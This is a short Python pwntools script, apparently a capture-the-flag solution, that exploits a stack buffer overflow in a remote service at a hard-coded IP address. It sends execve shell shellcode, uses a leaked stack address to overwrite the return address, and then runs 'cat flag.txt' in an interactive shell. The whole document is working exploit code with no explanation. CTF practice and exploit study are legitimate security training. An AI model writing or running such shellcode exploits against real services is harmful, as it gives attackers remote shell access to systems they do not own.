from pwn import * 

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x34\x0b\xcd\x80"
payload = ""
payload += shellcode
payload += "A"*(32-len(shellcode))
p = remote("3.92.136.78",5001)
p.recvuntil("CTF!\n")
leak = p.recvline()
leak = int(leak,16)
print "leak :",hex(leak)
our_buffer = leak - 50
payload += p32(our_buffer)
print "our_buffer: ",hex(our_buffer)
p.recvuntil("notes:")
p.sendline(payload)
p.sendline("cat flag.txt")
p.interactive()